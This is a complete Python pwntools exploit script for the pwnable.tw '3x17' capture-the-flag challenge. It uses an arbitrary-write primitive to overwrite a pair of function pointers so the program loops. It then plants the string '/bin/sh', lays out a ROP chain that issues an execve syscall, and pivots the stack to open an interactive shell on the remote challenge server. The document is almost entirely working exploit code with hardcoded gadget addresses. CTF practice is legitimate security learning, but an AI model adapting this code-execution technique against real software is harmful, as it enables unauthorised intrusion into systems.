#!/usr/bin/env python

from pwn import *

DUMMY = 0
QWORD = 8
context.terminal = ['tmux', 'splitw', '-h']


class Exploit:
    def __init__(self):
        pass

    def conn(self):
        if args.REMOTE:
            return remote('chall.pwnable.tw', 10105)
        self.elf = ELF('./given/3x17')
        p = process([self.elf.path])
        if args.GDB:
            gdb.attach(p, '\n'.join([
                #'b *0x401c4c' # return of the FUN_401b6d
            ]))
        return p

    def exploit(self):
        self.p = self.conn()

        two_fptrs = 0x4b40f0

        # make repeat:
        # The fptr[1] will execute first, then fptr[0]
        # We use fptr[0] == [arbitrary write function] and then fptr[0] == loop
        self.arbitrary_write(two_fptrs, [p64(0x402960), p64(0x401b6d)])

        # '/bin/sh'
        binsh_address = two_fptrs - QWORD
        self.arbitrary_write(binsh_address, [b'/bin/sh\x00'])

        # construct the data on the region
        rop = self.rop_chain(binsh_address)
        for i in range(0, len(rop), 3):
            addr = two_fptrs + (2 + i) * QWORD
            self.arbitrary_write(addr, rop[i:i+3])

        #
        leave_ret = 0x472bc1
        ret = 0x472bc2
        self.arbitrary_write(two_fptrs, [p64(leave_ret), p64(ret)])
        self.p.interactive()

    def rop_chain(self, binsh):
        pop_rdx_ret = 0x446e35
        pop_rdi_ret = 0x401696
        pop_rsi_ret = 0x406c30
        pop_rax_ret = 0x41e4af
        syscall = 0x4022b4
        return [
            p64(pop_rdx_ret),
            p64(0),
            p64(pop_rsi_ret),
            p64(0),
            p64(pop_rdi_ret),
            p64(binsh),
            p64(pop_rax_ret),
            p64(0x3b),
            p64(syscall),
        ]

    def arbitrary_write(self, addr: int, data: list[bytes]):
        log.info(f'writing {hex(addr)} with data {data}')
        self.p.sendafter(b'addr:', str(addr).encode())
        self.p.sendafter(b'data:', b''.join(data))


if __name__ == '__main__':
    exploit = Exploit()
    exploit.exploit()
